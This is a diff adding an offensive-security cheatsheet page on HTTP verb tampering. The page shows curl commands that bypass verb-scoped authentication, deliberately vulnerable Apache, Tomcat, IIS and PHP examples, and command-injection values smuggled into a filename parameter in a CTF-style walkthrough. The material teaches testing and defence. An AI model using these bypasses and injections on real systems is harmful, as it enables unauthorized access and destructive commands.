@@ -1,0 +1,353 @@
+<!doctype html>
+<html lang="en"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width, initial-scale=1">
+<title>HTTP verb tampering · ArxOS cheatsheets</title><link rel="stylesheet" href="../../../../codex.css"></head>
+<body><header class="cx-top"><a class="cx-brand" href="../../../../index.html">ArxOS</a><span class="cx-sub">Cheatsheets</span>
+<a class="cx-search-link" href="../../../../index.html#search">Search</a></header>
+<main class="cx-main"><nav class="cx-crumbs"><a href="../../../../index.html">Cheatsheets</a> › Web › Authentication &amp; Sessions</nav><h1>HTTP verb tampering</h1><p class="cx-lede">When auth requirements or input filters are scoped to specific HTTP methods, swap the verb to slip past - bypassing Basic-Auth via HEAD/OPTIONS on `&lt;Limit GET POST&gt;` configs, defeating injection filters that check $_POST but the sink uses $_REQUEST, and reading the misconfigured Apache/Tomcat/IIS directives that enable each pattern.</p><div class="cx-tags"><span class="cx-tag">MITRE T1190, T1556</span><span class="cx-tag">D3FEND D3-IAA</span><span class="cx-tag">IMPACT AuthBypass, FilterBypass</span><span class="cx-tag">OWASP A05, A07</span></div><article class="cx-body"><h2 id="tldr">TL;DR</h2>
+<p>HTTP supports nine verbs (GET, POST, HEAD, PUT, DELETE, OPTIONS, PATCH, TRACE, CONNECT). When an app's auth requirement or input filter is scoped to specific verbs but the underlying handler accepts more, swap the verb to bypass:</p>
+<figure class="cx-code"><figcaption></figcaption><pre><code># 1. Probe what verbs the server accepts
+curl -i -X OPTIONS http://target/admin/
+# Allow: POST,OPTIONS,HEAD,GET    ← HEAD reachable
+
+# 2. Bypass auth scoped to GET/POST by using HEAD (or PUT, DELETE, etc.)
+curl -i -X HEAD &#x27;http://target/admin/reset.php?confirm=yes&#x27;
+# Handler runs; no auth check; no response body (HEAD returns headers only)
+
+# 3. Bypass an input filter that checks only $_POST when the sink uses $_REQUEST
+curl &#x27;http://target/create?filename=file;cp%20/flag.txt%20./&#x27;
+# GET parameter slips past the POST-only filter</code></pre></figure>
+<p>Success indicator: the protected action's effect happens (file deleted/created, password changed, etc.) without supplying credentials - or a malicious payload is processed despite a filter being "in place."</p>
+<h2 id="two-distinct-patterns-under-one-name">Two distinct patterns under one name</h2>
+<p>The OWASP "HTTP Verb Tampering" label covers two mechanically different mistakes. Knowing which one you're attacking decides which payload works.</p>
+<table>
+<thead>
+<tr>
+<th>Pattern</th>
+<th>Root cause</th>
+<th>Where it lives</th>
+<th>Typical bypass</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><strong>Auth scoped to specific verbs</strong></td>
+<td>Apache <code>&lt;Limit GET POST&gt;</code>, Tomcat <code>&lt;http-method&gt;</code>, IIS <code>verbs="GET"</code> - the auth directive only applies to listed methods</td>
+<td>Server config (<code>.htaccess</code>, <code>web.xml</code>, <code>web.config</code>)</td>
+<td>Request with an unlisted verb (<code>HEAD</code>, <code>OPTIONS</code>, <code>PUT</code>)</td>
+</tr>
+<tr>
+<td><strong>Filter checks one source, sink uses another</strong></td>
+<td><code>preg_match($pattern, $_POST['x'])</code> to validate, then <code>system($_REQUEST['x'])</code> to use</td>
+<td>Application code</td>
+<td>Move the value to a request component the filter doesn't inspect (GET ↔ POST, header, cookie)</td>
+</tr>
+</tbody>
+</table>
+<p>The first pattern is loud - auth simply doesn't fire. The second is subtle - the filter is intact and active, but the input bypasses it via a different channel.</p>
+<h2 id="pattern-1-authentication-scoped-to-specific-verbs">Pattern 1 - Authentication scoped to specific verbs</h2>
+<h3 id="the-vulnerability">The vulnerability</h3>
+<p>An Apache <code>.htaccess</code> or vhost stanza:</p>
+<figure class="cx-code"><figcaption>apache</figcaption><pre><code class="language-apache">&lt;Directory &quot;/var/www/html/admin&quot;&gt;
+    AuthType Basic
+    AuthName &quot;Admin Panel&quot;
+    AuthUserFile /etc/apache2/.htpasswd
+    &lt;Limit GET POST&gt;
+        Require valid-user
+    &lt;/Limit&gt;
+&lt;/Directory&gt;</code></pre></figure>
+<p>The <code>&lt;Limit GET POST&gt;</code> block restricts the <code>Require valid-user</code> directive to <em>just</em> GET and POST. Other verbs reach the handler with no auth check at all.</p>
+<p>Equivalent Tomcat <code>web.xml</code>:</p>
+<figure class="cx-code"><figcaption>xml</figcaption><pre><code class="language-xml">&lt;security-constraint&gt;
+    &lt;web-resource-collection&gt;
+        &lt;url-pattern&gt;/admin/*&lt;/url-pattern&gt;
+        &lt;http-method&gt;GET&lt;/http-method&gt;
+        &lt;http-method&gt;POST&lt;/http-method&gt;
+    &lt;/web-resource-collection&gt;
+    &lt;auth-constraint&gt;
+        &lt;role-name&gt;admin&lt;/role-name&gt;
+    &lt;/auth-constraint&gt;
+&lt;/security-constraint&gt;</code></pre></figure>
+<p>Equivalent ASP.NET <code>web.config</code>:</p>
+<figure class="cx-code"><figcaption>xml</figcaption><pre><code class="language-xml">&lt;system.web&gt;
+    &lt;authorization&gt;
+        &lt;allow verbs=&quot;GET,POST&quot; roles=&quot;admin&quot;/&gt;
+        &lt;deny verbs=&quot;GET,POST&quot; users=&quot;*&quot;/&gt;
+    &lt;/authorization&gt;
+&lt;/system.web&gt;</code></pre></figure>
+<p>In every case, the auth/authorization directive enumerates verbs. Verbs not enumerated bypass entirely.</p>
+<h3 id="identifying-the-attack-surface">Identifying the attack surface</h3>
+<p>When a page returns <code>401 Unauthorized</code> on direct access, that's where to test:</p>
+<figure class="cx-code"><figcaption>shell</figcaption><pre><code class="language-shell">$ curl -i http://target/admin/reset.php
+HTTP/1.1 401 Unauthorized
+WWW-Authenticate: Basic realm=&quot;Admin Panel&quot;</code></pre></figure>
+<p>Without credentials, probe what the server lets you send via <code>OPTIONS</code>:</p>
+<figure class="cx-code"><figcaption>shell</figcaption><pre><code class="language-shell">$ curl -i -X OPTIONS http://target/admin/
+HTTP/1.1 200 OK
+Allow: POST,OPTIONS,HEAD,GET</code></pre></figure>
+<p>The <code>Allow:</code> header lists usable verbs. Note that some servers return verbs the <em>server</em> supports without checking whether the <em>application</em> handles them - both matter. HEAD is the most common bypass target because nearly every server accepts HEAD and most apps treat HEAD identically to GET (the handler runs; only the response body is suppressed).</p>
+<h3 id="exploiting-via-head">Exploiting via HEAD</h3>
+<figure class="cx-code"><figcaption>shell</figcaption><pre><code class="language-shell"># What you can&#x27;t do as an anonymous user:
+$ curl -i -X GET http://target/admin/reset.php
+HTTP/1.1 401 Unauthorized
+
+# What you can:
+$ curl -i -X HEAD http://target/admin/reset.php
+HTTP/1.1 200 OK
+Content-Type: text/html
+Content-Length: 0</code></pre></figure>
+<p>The HEAD returns 200 with no body. The server didn't run the auth check (because HEAD wasn't in <code>&lt;Limit GET POST&gt;</code>), passed the request to the application, and the application processed the action - <code>reset.php</code> deleted all files. The lack of response body is fine; the <em>side effect</em> is the goal.</p>
+<p>For verbs that send a body (PUT, POST, PATCH), the bypass works the same way provided the server allows the verb:</p>
+<figure class="cx-code"><figcaption>shell</figcaption><pre><code class="language-shell">$ curl -i -X PUT http://target/admin/reset.php -d &#x27;confirm=yes&#x27;
+HTTP/1.1 200 OK</code></pre></figure>
+<h3 id="when-head-doesnt-work">When HEAD doesn't work</h3>
+<p>Some servers (and modern frameworks) explicitly map HEAD to GET for auth purposes - the auth check fires on HEAD even if <code>&lt;Limit&gt;</code> only lists GET. In that case, try the other verbs:</p>
+<figure class="cx-code"><figcaption>shell</figcaption><pre><code class="language-shell">for verb in HEAD OPTIONS PUT DELETE PATCH TRACE CONNECT PROPFIND MKCOL COPY MOVE LOCK UNLOCK; do
+    code=$(curl -s -o /dev/null -w &#x27;%{http_code}&#x27; -X &quot;$verb&quot; http://target/admin/reset.php)
+    echo &quot;$verb: $code&quot;
+done</code></pre></figure>
+<p>Each <code>200</code>/<code>30x</code>/<code>5xx</code> is interesting; each <code>401</code> means the auth check fired. The WebDAV verbs (<code>PROPFIND</code>, <code>MKCOL</code>, <code>COPY</code>, etc.) catch some IIS misconfigurations that miss them entirely.</p>
+<h3 id="burp-repeater-workflow">Burp Repeater workflow</h3>
+<p>In Burp:</p>
+<ol>
+<li>Send the 401-responding request to Repeater</li>
+<li>Right-click in the request panel → "Change request method" - Burp cycles through methods, automatically adding <code>Content-Type</code> and <code>Content-Length</code> headers when switching to POST/PUT/PATCH</li>
+<li>Send; observe the response</li>
+</ol>
+<p>The "Change request method" feature is the right form here because manually editing the verb often forgets that POST needs a body and the right Content-Type header - and missing those produces 400 responses that look like auth failures but aren't.</p>
+<h2 id="pattern-2-filter-checks-one-source-sink-uses-another">Pattern 2 - Filter checks one source, sink uses another</h2>
+<h3 id="the-vulnerability_1">The vulnerability</h3>
+<figure class="cx-code"><figcaption>php</figcaption><pre><code class="language-php">if (isset($_REQUEST[&#x27;filename&#x27;])) {
+    if (!preg_match(&#x27;/[^A-Za-z0-9. _-]/&#x27;, $_POST[&#x27;filename&#x27;])) {
+        system(&quot;touch &quot; . $_REQUEST[&#x27;filename&#x27;]);
+    } else {
+        echo &quot;Malicious Request Denied!&quot;;
+    }
+}</code></pre></figure>
+<p>Walk through what each line does:</p>
+<ul>
+<li>Line 1: <code>$_REQUEST['filename']</code> - checks if a filename param exists in <em>any</em> of GET/POST/COOKIE</li>
+<li>Line 2: filter runs against <code>$_POST['filename']</code> - looks at only POST</li>
+<li>Line 3: <code>system()</code> uses <code>$_REQUEST['filename']</code> - back to any of GET/POST/COOKIE</li>
+</ul>
+<p>The mismatch: the validator inspects POST, but the dangerous sink consumes any source. Sending the malicious value via GET means <code>$_POST['filename']</code> is empty (clean), the regex passes, and <code>$_REQUEST['filename']</code> (which sees GET) reaches <code>system()</code> with the unsanitized input.</p>
+<h3 id="identifying-the-surface">Identifying the surface</h3>
+<p>Pattern 2 is subtle in a black-box test because the filter genuinely works for the input you usually send. You only see it when you happen to switch verbs and notice the filter stopped firing.</p>
+<p>Indicators:</p>
+<ul>
+<li>A form posts to an endpoint. POSTing malicious content blocks. The <em>same</em> endpoint accessed via GET (just adding the form data as query parameters) doesn't block.</li>
+<li>An error message appears for some inputs but not others, and the difference correlates with HTTP method rather than content.</li>
+<li>An endpoint advertised as POST-only handles GET requests just fine when probed.</li>
+</ul>
+<h3 id="exploiting">Exploiting</h3>
+<p>The original (blocked) attempt:</p>
+<figure class="cx-code"><figcaption>http</figcaption><pre><code class="language-http">POST /create.php HTTP/1.1
+Host: target
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 25
+
+filename=file;%20touch%20pwn</code></pre></figure>
+<p>Response: <code>Malicious Request Denied!</code></p>
+<p>The bypass - move the parameter to the query string:</p>
+<figure class="cx-code"><figcaption>shell</figcaption><pre><code class="language-shell">$ curl &#x27;http://target/create.php?filename=file;%20touch%20pwn&#x27;</code></pre></figure>
+<p>The PHP filter looks at <code>$_POST['filename']</code> (empty), regex passes, <code>$_REQUEST['filename']</code> (which sees the GET parameter) flows into <code>system()</code> - command injection achieved.</p>
+<p>For typical scenarios that want both a benign file and an injected command:</p>
+<figure class="cx-code"><figcaption></figcaption><pre><code>filename=file;%20cp%20/flag.txt%20./</code></pre></figure>
+<p>After the request, <code>flag.txt</code> appears in the web root.</p>
+<h3 id="burps-change-request-method">Burp's "Change Request Method"</h3>
+<p>The cleanest way is in Burp:</p>
+<ol>
+<li>Intercept the blocked POST</li>
+<li>Right-click → Change request method → POST flips to GET; body parameters move to the query string</li>
+<li>Forward</li>
+</ol>
+<p>Burp handles the format conversion correctly. Doing it manually means remembering to URL-encode the value, drop Content-Type/Length headers, and reformat the request line.</p>
+<h3 id="variants-of-the-same-bug">Variants of the same bug</h3>
+<p>The same mistake appears in other languages:</p>
+<table>
+<thead>
+<tr>
+<th>Language</th>
+<th>Validates only on...</th>
+<th>Sink uses...</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>PHP</td>
+<td><code>$_POST</code>, <code>$_GET</code>, <code>$_COOKIE</code></td>
+<td><code>$_REQUEST</code></td>
+</tr>
+<tr>
+<td>Java (Servlet)</td>
+<td><code>request.getParameterValues()</code> on form data</td>
+<td><code>request.getParameter()</code> (any source)</td>
+</tr>
+<tr>
+<td>Node.js (Express)</td>
+<td><code>req.body.x</code></td>
+<td><code>req.query.x \|\| req.body.x</code></td>
+</tr>
+<tr>
+<td>ASP.NET</td>
+<td><code>Request.Form["x"]</code></td>
+<td><code>Request["x"]</code> (any source)</td>
+</tr>
+<tr>
+<td>Rails</td>
+<td><code>params.permit(...)</code> filtered out of <code>params[:body]</code></td>
+<td><code>params[:x]</code> (still includes query)</td>
+</tr>
+</tbody>
+</table>
+<p>The pattern generalizes to non-verb-based source confusion too - cookie-based override of a header check, header-based override of a body check, multipart-vs-form-encoded confusion. Anywhere the validator looks at one source and the sink looks at a broader set, the bypass is to move the value.</p>
+<h2 id="a-combined-pattern-walkthrough">A combined-pattern walkthrough</h2>
+<p>The typical scenario combines both patterns and is worth tracing.</p>
+<p>The app is a File Manager with two protected operations:</p>
+<ul>
+<li><code>POST /create.php</code> accepts <code>filename</code> and runs <code>touch $filename</code></li>
+<li><code>GET /admin/reset.php</code> requires Basic Auth and deletes all files</li>
+</ul>
+<p>Operator path:</p>
+<figure class="cx-code"><figcaption>shell</figcaption><pre><code class="language-shell"># Step 1: Confirm the auth scope
+$ curl -i http://target/admin/reset.php
+HTTP/1.1 401 Unauthorized
+WWW-Authenticate: Basic realm=&quot;Admin Panel&quot;
+
+# Step 2: Probe allowed verbs
+$ curl -i -X OPTIONS http://target/
+Allow: POST,OPTIONS,HEAD,GET
+
+# Step 3: Auth bypass via HEAD
+$ curl -i -X HEAD http://target/admin/reset.php
+HTTP/1.1 200 OK
+# (All files now deleted)
+
+# Step 4: For the injection-filter bypass, the original POST gets blocked
+$ curl -X POST http://target/create.php -d &#x27;filename=file;touch%20pwn&#x27;
+Malicious Request Denied!
+
+# Step 5: GET bypasses the filter
+$ curl &#x27;http://target/create.php?filename=file;%20touch%20pwn&#x27;
+# (Both &#x27;file&#x27; and &#x27;pwn&#x27; files created)
+
+# Step 6: Combine - read /flag via the GET injection
+$ curl &#x27;http://target/create.php?filename=file;%20cp%20/flag.txt%20./&#x27;
+# Flag now in web root, fetch it
+$ curl http://target/flag.txt
+FLAG{...}</code></pre></figure>
+<p>Two different verb-tampering bugs in one app. Each enables a separate primitive; chained, they yield arbitrary file read.</p>
+<h2 id="edge-cases-worth-knowing">Edge cases worth knowing</h2>
+<h3 id="http-method-override-headers">HTTP method override headers</h3>
+<p>Some apps respect <code>X-HTTP-Method-Override</code>, <code>X-HTTP-Method</code>, or <code>X-Method-Override</code> headers for legacy or REST-API reasons:</p>
+<figure class="cx-code"><figcaption>shell</figcaption><pre><code class="language-shell">curl -X POST http://target/admin/reset.php \
+     -H &#x27;X-HTTP-Method-Override: GET&#x27;</code></pre></figure>
+<p>The actual request is POST (avoiding the GET-auth check) but the app routes it as GET (executing the action). Rails, Symfony, Spring, and some Express middlewares enable this by default. Worth probing on any app that fails the simple HEAD bypass.</p>
+<h3 id="method-as-body-parameter">Method-as-body-parameter</h3>
+<p>Same idea, different vehicle. Some frameworks accept the method via a body parameter:</p>
+<figure class="cx-code"><figcaption>http</figcaption><pre><code class="language-http">POST /admin/reset.php HTTP/1.1
+Content-Type: application/x-www-form-urlencoded
+
+_method=DELETE</code></pre></figure>
+<p>This is Rails's <code>_method</code> convention. The request line is POST (so the server-level auth scoping on DELETE doesn't fire) but Rails treats the request as DELETE downstream.</p>
+<h3 id="trace-for-header-reflection">TRACE for header reflection</h3>
+<p><code>TRACE</code> echoes the request back. Where allowed, that reflects cookies set by intermediate proxies - relevant for some XST (Cross-Site Tracing) attacks against <code>HttpOnly</code> cookies. Most servers disable TRACE for this reason; if a target permits it, that itself is a finding.</p>
+<h3 id="verb-tampering-vs-http-request-smuggling">Verb tampering vs HTTP request smuggling</h3>
+<p>Adjacent technique with the same family resemblance. Smuggling exploits inconsistencies between a frontend proxy and backend server in how request boundaries are parsed. Verb tampering exploits inconsistencies in how a single component parses the verb. Both rely on "two parsers disagree" but at different layers.</p>
+<h2 id="defensive-notes">Defensive notes</h2>
+<p>For each pattern, the fix tells you what to look for as an attacker:</p>
+<table>
+<thead>
+<tr>
+<th>Pattern</th>
+<th>Operator-side observation</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>&lt;Limit GET POST&gt;</code></td>
+<td>Look for <code>&lt;Limit&gt;</code> directives (Apache), enumerated <code>&lt;http-method&gt;</code> (Tomcat), or <code>verbs="GET"</code> (IIS) in any leaked config - they signal scoping mistakes</td>
+</tr>
+<tr>
+<td><code>&lt;LimitExcept&gt;</code> (correct form)</td>
+<td>This is the <em>secure</em> directive; if you see it, the bypass via alternate verbs is closed</td>
+</tr>
+<tr>
+<td><code>Allow:</code> lists in OPTIONS responses</td>
+<td>If <code>Allow:</code> lists fewer verbs than you'd expect, the server is rejecting at the HTTP layer - bypass paths are narrower</td>
+</tr>
+<tr>
+<td>Method override headers</td>
+<td>Servers that respect <code>X-HTTP-Method-Override</code> may be patched at the framework level but not at the application level (or vice versa) - try both layers</td>
+</tr>
+</tbody>
+</table>
+<h2 id="quick-reference">Quick reference</h2>
+<table>
+<thead>
+<tr>
+<th>Task</th>
+<th>Command / pattern</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Probe allowed verbs</td>
+<td><code>curl -i -X OPTIONS http://target/path/</code></td>
+</tr>
+<tr>
+<td>Auth bypass via HEAD</td>
+<td><code>curl -i -X HEAD http://target/protected/action</code></td>
+</tr>
+<tr>
+<td>Auth bypass via OPTIONS</td>
+<td><code>curl -i -X OPTIONS http://target/protected/action</code></td>
+</tr>
+<tr>
+<td>Auth bypass via PUT/DELETE</td>
+<td><code>curl -i -X PUT http://target/path -d 'data'</code></td>
+</tr>
+<tr>
+<td>Filter bypass POST → GET</td>
+<td>Move body params to query string</td>
+</tr>
+<tr>
+<td>Burp method swap</td>
+<td>Right-click request → Change request method</td>
+</tr>
+<tr>
+<td>Method override header</td>
+<td><code>-H 'X-HTTP-Method-Override: DELETE'</code></td>
+</tr>
+<tr>
+<td>Method override body param</td>
+<td><code>_method=DELETE</code> (Rails / some Express)</td>
+</tr>
+<tr>
+<td>Iterate every verb</td>
+<td>Loop over <code>HEAD OPTIONS PUT DELETE PATCH TRACE PROPFIND MKCOL COPY MOVE LOCK UNLOCK</code></td>
+</tr>
+<tr>
+<td>Vulnerable Apache directive</td>
+<td><code>&lt;Limit GET POST&gt;...&lt;Require&gt;...&lt;/Limit&gt;</code></td>
+</tr>
+<tr>
+<td>Vulnerable Tomcat directive</td>
+<td><code>&lt;http-method&gt;GET&lt;/http-method&gt;</code> in <code>&lt;security-constraint&gt;</code></td>
+</tr>
+<tr>
+<td>Vulnerable IIS directive</td>
+<td><code>&lt;allow verbs="GET" roles="..."/&gt;</code> in <code>&lt;authorization&gt;</code></td>
+</tr>
+<tr>
+<td>Vulnerable PHP filter pattern</td>
+<td>filter checks <code>$_POST['x']</code>, sink uses <code>$_REQUEST['x']</code></td>
+</tr>
+<tr>
+<td>Bypass via cookie source</td>
+<td>Same pattern - value in <code>Cookie</code> reaches <code>$_REQUEST</code> but bypasses <code>$_POST</code> check</td>
+</tr>
+</tbody>
+</table>
+<p>For the related cookie-attribute attacks see <a href="../cookie-tampering/index.html">Cookie tampering</a>. For session-fixation patterns that often appear alongside misconfigured auth see <a href="../session-fixation/index.html">Session fixation</a>.</p></article><nav class="cx-pager"><a class="cx-prev" href="../jwt/index.html">Previous: JWT</a></nav></main>
+<footer class="cx-foot"><p>For authorized testing and study only. <a href="../../../../license.html">License</a></p></footer>
+<script src="../../../../codex.js"></script></body></html>
